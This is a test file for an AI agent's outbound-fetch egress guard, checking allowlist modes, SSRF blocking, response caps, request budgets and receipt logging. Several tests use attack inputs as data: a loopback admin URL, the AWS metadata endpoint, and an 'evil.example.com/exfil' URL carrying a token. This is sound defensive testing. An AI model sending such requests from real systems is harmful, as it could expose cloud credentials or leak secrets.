/**
 * Tests for src/lib/outbound-fetch.ts.
 *
 * We mock `defense-receipts` so the assertions focus on outbound-fetch's
 * own policy/behavior, not the receipt subsystem (which has its own
 * test file). `fetch` is stubbed via globalThis.
 */

import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";

const { emitMock, capMock } = vi.hoisted(() => ({
  emitMock: vi.fn(async () => ({}) as Record<string, unknown>),
  capMock: vi.fn(async () => ({}) as Record<string, unknown>),
}));

vi.mock("@/lib/logger", () => ({
  createLogger: () => ({
    info: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
  }),
}));

vi.mock("@/lib/defense-receipts", async () => {
  const actual = await vi.importActual<typeof import("@/lib/defense-receipts")>(
    "@/lib/defense-receipts",
  );
  return {
    ...actual,
    emitDefenseReceipt: emitMock,
  };
});

vi.mock("@/lib/capability-receipts", async () => {
  const actual = await vi.importActual<
    typeof import("@/lib/capability-receipts")
  >("@/lib/capability-receipts");
  return {
    ...actual,
    emitCapabilityReceipt: capMock,
  };
});

import {
  outboundFetch,
  resolvePolicy,
  EgressBlockedError,
} from "../outbound-fetch";

function mockResponse(
  status: number,
  body: string,
  headers: Record<string, string> = {},
): Response {
  return new Response(body, {
    status,
    headers: { "content-type": "text/plain", ...headers },
  });
}

const originalFetch = globalThis.fetch;
const originalEnv = { ...process.env };

beforeEach(() => {
  emitMock.mockClear();
  capMock.mockClear();
  process.env.NODE_ENV = "test";
  delete process.env.AGENT_EGRESS_MODE;
  delete process.env.AGENT_EGRESS_ALLOWLIST;
});

afterEach(() => {
  globalThis.fetch = originalFetch;
  Object.assign(process.env, originalEnv);
});

describe("resolvePolicy", () => {
  it("defaults to 'open' outside production", () => {
    delete process.env.AGENT_EGRESS_MODE;
    process.env.NODE_ENV = "test";
    const p = resolvePolicy({ ruleId: "x" });
    expect(p.mode).toBe("open");
  });

  it("defaults to 'allowlist' in production", () => {
    delete process.env.AGENT_EGRESS_MODE;
    process.env.NODE_ENV = "production";
    const p = resolvePolicy({ ruleId: "x" });
    expect(p.mode).toBe("allowlist");
  });

  it("respects AGENT_EGRESS_MODE env", () => {
    process.env.AGENT_EGRESS_MODE = "off";
    expect(resolvePolicy({ ruleId: "x" }).mode).toBe("off");
    process.env.AGENT_EGRESS_MODE = "allowlist";
    expect(resolvePolicy({ ruleId: "x" }).mode).toBe("allowlist");
  });

  it("merges env allowlist with per-call hosts", () => {
    process.env.AGENT_EGRESS_ALLOWLIST = "api.openai.com, api.stripe.com";
    const p = resolvePolicy({
      ruleId: "x",
      allowedHosts: ["en.wikipedia.org"],
    });
    expect(p.allowedHosts).toEqual(
      expect.arrayContaining([
        "api.openai.com",
        "api.stripe.com",
        "en.wikipedia.org",
      ]),
    );
  });

  it("modeOverride wins over env", () => {
    process.env.AGENT_EGRESS_MODE = "off";
    expect(resolvePolicy({ ruleId: "x", modeOverride: "open" }).mode).toBe(
      "open",
    );
  });
});

describe("outboundFetch — policy enforcement", () => {
  it("blocks SSRF (private IP) even in 'open' mode", async () => {
    globalThis.fetch = vi.fn() as unknown as typeof fetch;
    await expect(
      outboundFetch(
        "http://127.0.0.1/admin",
        {},
        { ruleId: "test", modeOverride: "open" },
      ),
    ).rejects.toBeInstanceOf(EgressBlockedError);
    expect(globalThis.fetch).not.toHaveBeenCalled();
    expect(emitMock).toHaveBeenCalledTimes(1);
    expect(emitMock.mock.calls[0][0].category).toBe("ssrf");
  });

  it("blocks AWS metadata endpoint", async () => {
    globalThis.fetch = vi.fn() as unknown as typeof fetch;
    await expect(
      outboundFetch(
        "http://169.254.169.254/latest/meta-data/",
        {},
        { ruleId: "test", modeOverride: "open" },
      ),
    ).rejects.toBeInstanceOf(EgressBlockedError);
    expect(emitMock).toHaveBeenCalled();
  });

  it("blocks non-https URLs", async () => {
    globalThis.fetch = vi.fn() as unknown as typeof fetch;
    await expect(
      outboundFetch(
        "http://api.openai.com/v1/chat",
        {},
        { ruleId: "test", modeOverride: "open" },
      ),
    ).rejects.toBeInstanceOf(EgressBlockedError);
  });

  it("blocks non-allowed host under allowlist mode", async () => {
    globalThis.fetch = vi.fn() as unknown as typeof fetch;
    await expect(
      outboundFetch(
        "https://evil.example.com/exfil",
        {},
        {
          ruleId: "test",
          modeOverride: "allowlist",
          allowedHosts: ["en.wikipedia.org"],
        },
      ),
    ).rejects.toBeInstanceOf(EgressBlockedError);
    expect(emitMock).toHaveBeenCalledWith(
      expect.objectContaining({ category: "egress-blocked" }),
    );
  });

  it("permits an allowlisted host", async () => {
    globalThis.fetch = vi
      .fn()
      .mockResolvedValueOnce(
        mockResponse(200, "hello world"),
      ) as unknown as typeof fetch;
    const res = await outboundFetch(
      "https://en.wikipedia.org/wiki/Main_Page",
      {},
      {
        ruleId: "test",
        modeOverride: "allowlist",
        allowedHosts: ["en.wikipedia.org"],
      },
    );
    expect(res.status).toBe(200);
    expect(res.body).toBe("hello world");
    expect(emitMock).not.toHaveBeenCalled();
  });

  it("blocks ALL hosts in 'off' mode", async () => {
    globalThis.fetch = vi.fn() as unknown as typeof fetch;
    await expect(
      outboundFetch(
        "https://en.wikipedia.org/x",
        {},
        {
          ruleId: "test",
          modeOverride: "off",
          allowedHosts: ["en.wikipedia.org"],
        },
      ),
    ).rejects.toBeInstanceOf(EgressBlockedError);
  });
});

describe("outboundFetch — body capping", () => {
  it("truncates body that exceeds maxResponseBytes", async () => {
    const big = "x".repeat(10_000);
    globalThis.fetch = vi
      .fn()
      .mockResolvedValueOnce(mockResponse(200, big)) as unknown as typeof fetch;
    const res = await outboundFetch(
      "https://en.wikipedia.org/x",
      {},
      {
        ruleId: "test",
        modeOverride: "allowlist",
        allowedHosts: ["en.wikipedia.org"],
        maxResponseBytes: 100,
      },
    );
    expect(res.truncated).toBe(true);
    expect(res.bytes.byteLength).toBe(100);
  });

  it("does not truncate when body fits", async () => {
    globalThis.fetch = vi
      .fn()
      .mockResolvedValueOnce(
        mockResponse(200, "small"),
      ) as unknown as typeof fetch;
    const res = await outboundFetch(
      "https://en.wikipedia.org/x",
      {},
      {
        ruleId: "test",
        modeOverride: "allowlist",
        allowedHosts: ["en.wikipedia.org"],
        maxResponseBytes: 1024,
      },
    );
    expect(res.truncated).toBe(false);
    expect(res.body).toBe("small");
  });
});

describe("outboundFetch — session metering", () => {
  it("emits a 'budget' receipt + throws when request cap exceeded", async () => {
    globalThis.fetch = vi
      .fn()
      .mockResolvedValueOnce(
        mockResponse(200, "ok"),
      ) as unknown as typeof fetch;
    // Pre-seed the session so the next request will trip the cap.
    const session = { requests: 100, bytes: 0 };
    await expect(
      outboundFetch(
        "https://en.wikipedia.org/x",
        {},
        {
          ruleId: "test",
          modeOverride: "allowlist",
          allowedHosts: ["en.wikipedia.org"],
          session,
        },
      ),
    ).rejects.toBeInstanceOf(EgressBlockedError);
    expect(emitMock).toHaveBeenCalledWith(
      expect.objectContaining({ category: "budget" }),
    );
  });
});

describe("outboundFetch — defense-receipt details", () => {
  it("commits the URL (never logs raw URL into receipt body)", async () => {
    globalThis.fetch = vi.fn() as unknown as typeof fetch;
    await expect(
      outboundFetch(
        "https://evil.example.com/exfil?token=secret123",
        {},
        {
          ruleId: "test",
          modeOverride: "allowlist",
          allowedHosts: ["en.wikipedia.org"],
        },
      ),
    ).rejects.toBeInstanceOf(EgressBlockedError);
    const call = emitMock.mock.calls[0][0] as {
      commitments?: Record<string, string>;
    };
    expect(call.commitments?.url).toMatch(/^[0-9a-f]{64}$/);
  });
});

describe("outboundFetch — capability receipts on PERMITTED calls", () => {
  it("emits a 'fetch' capability receipt on allowed egress", async () => {
    globalThis.fetch = vi
      .fn()
      .mockResolvedValueOnce(
        mockResponse(200, "hello"),
      ) as unknown as typeof fetch;
    await outboundFetch(
      "https://en.wikipedia.org/wiki/AI",
      {},
      {
        ruleId: "agent.research-fetch",
        modeOverride: "allowlist",
        allowedHosts: ["en.wikipedia.org"],
        tenantId: "t1",
        userId: "u1",
      },
    );
    await Promise.resolve();
    expect(capMock).toHaveBeenCalledTimes(1);
    const call = capMock.mock.calls[0][0] as Record<string, unknown> & {
      sensitive?: Record<string, string>;
    };
    expect(call.kind).toBe("fetch");
    expect(call.outcome).toBe("allowed");
    expect(call.ruleId).toBe("agent.research-fetch");
    expect(call.policyMode).toBe("allowlist");
    expect(call.tenantId).toBe("t1");
    expect(call.userId).toBe("u1");
    // The raw URL goes through sensitive (capability-receipts hashes it
    // before persistence — covered by capability-receipts.test.ts).
    expect(call.sensitive?.url).toBe("https://en.wikipedia.org/wiki/AI");
  });

  it("marks outcome 'allowed-truncated' when body was capped", async () => {
    const big = "x".repeat(10_000);
    globalThis.fetch = vi
      .fn()
      .mockResolvedValueOnce(mockResponse(200, big)) as unknown as typeof fetch;
    await outboundFetch(
      "https://en.wikipedia.org/big",
      {},
      {
        ruleId: "test",
        modeOverride: "allowlist",
        allowedHosts: ["en.wikipedia.org"],
        maxResponseBytes: 50,
      },
    );
    await Promise.resolve();
    expect(capMock).toHaveBeenCalledTimes(1);
    expect(capMock.mock.calls[0][0].outcome).toBe("allowed-truncated");
  });

  it("does NOT emit a capability receipt on policy-denied calls", async () => {
    globalThis.fetch = vi.fn() as unknown as typeof fetch;
    await expect(
      outboundFetch(
        "https://evil.example.com/exfil",
        {},
        {
          ruleId: "test",
          modeOverride: "allowlist",
          allowedHosts: ["en.wikipedia.org"],
        },
      ),
    ).rejects.toBeInstanceOf(EgressBlockedError);
    await Promise.resolve();
    // Denied path emits a defense-receipt (covered above), NOT a
    // capability-receipt — capability receipts mean "this call was
    // permitted under our policy and here's what happened."
    expect(capMock).not.toHaveBeenCalled();
    expect(emitMock).toHaveBeenCalled();
  });
});
